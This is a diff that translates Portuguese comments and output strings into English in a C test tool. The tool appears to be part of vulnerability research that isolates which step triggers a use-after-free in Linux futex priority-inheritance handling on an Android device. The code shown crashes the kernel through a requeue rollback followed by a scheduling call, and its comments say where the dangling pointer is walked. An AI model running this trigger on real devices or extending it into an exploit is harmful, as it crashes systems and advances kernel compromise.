@@ -1,31 +1,31 @@
 /*
- * ghostlock_uaf_isolate.c — isola QUAL consumer derruba o device.
+ * ghostlock_uaf_isolate.c — isolates WHICH consumer crashes the device.
  *
- * Achado que motivou esta tool: ghostlock_uaf_check.c (Fase 3) derruba o
- * aquaman na perna VULN, mas o log para em "[vuln] cmp_errno=35" — ou seja,
- * o crash vem DEPOIS do rollback, na perna de teardown/consumidor, e nao
- * durante o CMP. E o device volta sozinho (PANIC_TIMEOUT=1), entao cada
- * teste custa um reboot, nao um power cycle.
+ * Finding that motivated this tool: ghostlock_uaf_check.c (Phase 3) crashes
+ * aquaman on the VULN leg, but the log stops at "[vuln] cmp_errno=35" — i.e.,
+ * the crash comes AFTER the rollback, in the teardown/consumer leg, and not
+ * during the CMP. And the device recovers on its own (PANIC_TIMEOUT=1), so each
+ * test costs a reboot, not a power cycle.
  *
- * Quatro pernas, uma por execucao (argv[1] = 1..4), para nao misturar
- * estado. Todas montam o mesmo trio PI; o que muda e o consumer:
+ * Four legs, one per execution (argv[1] = 1..4), to avoid mixing state.
+ * All set up the same PI trio; what changes is the consumer:
  *
- *   1 control   sem CMP (waiter sai por timeout), sem consumer
- *   2 vuln      CMP -> EDEADLK, sem consumer
- *   3 vuln+sched  CMP -> EDEADLK, consumer = pthread_setschedparam
- *   4 vuln+spin   CMP -> EDEADLK, consumer = nada, so espera o waiter sair
+ *   1 control       without CMP (waiter exits on timeout), without consumer
+ *   2 vuln          CMP -> EDEADLK, without consumer
+ *   3 vuln+sched    CMP -> EDEADLK, consumer = pthread_setschedparam
+ *   4 vuln+spin     CMP -> EDEADLK, consumer = none, just wait for waiter to exit
  *
- * Interpretacao:
- *   1 e 2 verdes + 3 vermelho  => o consumer e o gatilho. O walk em
- *        rt_mutex_setprio/rt_mutex_get_effective_prio desce pelo
- *        pi_blocked_on pendurado e o frame ja foi reocupado: e o UAF.
- *   2 vermelho                 => o proprio wake do waiter (rt_mutex_wake
- *        sobre a waiters tree com nodo pendurado) e o gatilho, e nao ha
- *        consumer utilizavel para calibracao.
- *   1 vermelho                 => a tool esta errada, nao o kernel.
+ * Interpretation:
+ *   1 and 2 green + 3 red      => consumer is the trigger. The walk in
+ *        rt_mutex_setprio/rt_mutex_get_effective_prio traverses the dangling
+ *        pi_blocked_on and the frame has already been reclaimed: that is the UAF.
+ *   2 red                      => waiter wakeup itself (rt_mutex_wake
+ *        over the waiters tree with dangling node) is the trigger, and there is
+ *        no usable consumer for calibration.
+ *   1 red                      => tool is wrong, not the kernel.
  *
- * Sem reclaim, sem carimbo, sem escrita em cred/funcptr, sem SELinux.
- * Nada persiste. Risco: reboot por teste, ja conhecido.
+ * No reclaim, no stamp, no writing to cred/funcptr, no SELinux.
+ * Nothing persists. Risk: reboot per test, already known.
  *
  * Build (NDK r29, ARM64, API 28):
  *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/\
@@ -64,7 +64,7 @@
 
 static uint32_t f_wait, f_target, f_chain;
 static volatile int w_ready, w_waiting, w_done, o_started;
-static volatile int consumer_mode;   /* 0 = sem consumer */
+static volatile int consumer_mode;   /* 0 = no consumer */
 static pthread_t waiter_tid;
 
 static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
@@ -92,9 +92,9 @@ static void *waiter_fn(void *u) {
     xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
     xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
     w_done = 1;
-    printf("[waiter] saiu do wait (waiter=%s)\n",
-           consumer_mode ? "vai receber consumer" : "sem consumer");
-    /* fica vivo e paradoxal: o frame de kernel ja foi liberado */
+    printf("[waiter] exited wait (waiter=%s)\n",
+           consumer_mode ? "will receive consumer" : "no consumer");
+    /* remains alive and paradoxical: kernel frame has already been freed */
     sleep(60);
     return NULL;
 }
@@ -107,7 +107,7 @@ static void *owner_fn(void *u) {
         usleep(1000);
     o_started = 1;
     xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);
-    printf("[owner] saiu do lock\n");
+    printf("[owner] exited lock\n");
     return NULL;
 }
 
@@ -118,8 +118,8 @@ int main(int argc, char **argv) {
     consumer_mode = (leg == 3);
 
     printf("[info] leg=%d (%s) with_cmp=%d consumer=%d\n", leg,
-           leg == 1 ? "control" : leg == 2 ? "vuln sem consumer"
-           : leg == 3 ? "vuln + setschedparam" : "vuln + espera",
+           leg == 1 ? "control" : leg == 2 ? "vuln without consumer"
+           : leg == 3 ? "vuln + setschedparam" : "vuln + wait",
            with_cmp, consumer_mode);
 
     f_wait = f_target = f_chain = 0;
@@ -145,11 +145,11 @@ int main(int argc, char **argv) {
         int e = errno;
         printf("[cmp] errno=%d (%s)\n", e, strerror(e));
         if (e != EDEADLK) {
-            printf("[verdict] rollback NAO atingido, aborta\n");
+            printf("[verdict] rollback NOT reached, aborting\n");
             return 3;
         }
     } else {
-        printf("[cmp] pulado (controle)\n");
+        printf("[cmp] skipped (control)\n");
         usleep(1300000);
     }
 
@@ -161,22 +161,22 @@ int main(int argc, char **argv) {
         usleep(20000);
         printf("[wait] w_done=0, %d\n", spins);
     }
-    printf("[wait] w_done=%d apos %d spins\n", w_done, spins);
+    printf("[wait] w_done=%d after %d spins\n", w_done, spins);
     if (!w_done) {
-        printf("[verdict] waiter nao voltou\n");
+        printf("[verdict] waiter did not return\n");
         return 2;
     }
 
     if (consumer_mode) {
         struct sched_param p = { .sched_priority = 0 };
-        printf("[consumer] antes do setschedparam\n");
+        printf("[consumer] before setschedparam\n");
         uint64_t t0 = now_ns();
         errno = 0;
         int r = pthread_setschedparam(waiter_tid, SCHED_BATCH, &p);
         printf("[consumer] BATCH ret=%d errno=%d(%s) %lluns\n", r, errno,
                r ? strerror(errno) : "ok",
                (unsigned long long)(now_ns() - t0));
-        printf("[consumer] antes do SCHED_OTHER\n");
+        printf("[consumer] before SCHED_OTHER\n");
         t0 = now_ns();
         errno = 0;
         r = pthread_setschedparam(waiter_tid, SCHED_OTHER, &p);
@@ -185,6 +185,6 @@ int main(int argc, char **argv) {
                (unsigned long long)(now_ns() - t0));
     }
 
-    printf("[verdict] leg=%d sobreviveu, consumer=%d\n", leg, consumer_mode);
+    printf("[verdict] leg=%d survived, consumer=%d\n", leg, consumer_mode);
     return 0;
 }
